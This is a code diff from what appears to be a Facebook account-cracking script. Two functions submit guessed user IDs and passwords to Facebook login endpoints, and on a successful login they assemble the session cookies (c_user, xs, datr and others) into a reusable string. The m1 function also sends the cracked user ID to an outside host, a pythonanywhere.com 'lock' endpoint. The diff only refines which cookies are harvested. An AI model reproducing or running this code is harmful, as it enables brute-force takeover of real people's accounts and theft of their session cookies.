@@ -966,7 +966,7 @@ def m1(idf,pwv):
    lo = session.post(f'https://pixel.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://shishirx.pythonanywhere.com/lock?uid={user}"
     reqx = requests.get(url).text
@@ -1049,7 +1049,7 @@ def m2(idf,pwv):
    lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&locale2=en_GB&refid=8',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
-    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+    coki=";".join([f"{key}={session.cookies.get(key)}" for key in ['sb', 'datr', 'ps_n', 'ps_l', 'locale', 'c_user', 'xs', 'fr', 'usida', 'wd', 'm_ls', 'presence']])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f'https://graph.facebook.com/{user}/picture?type=normal'
     reqx = requests.get(url).text
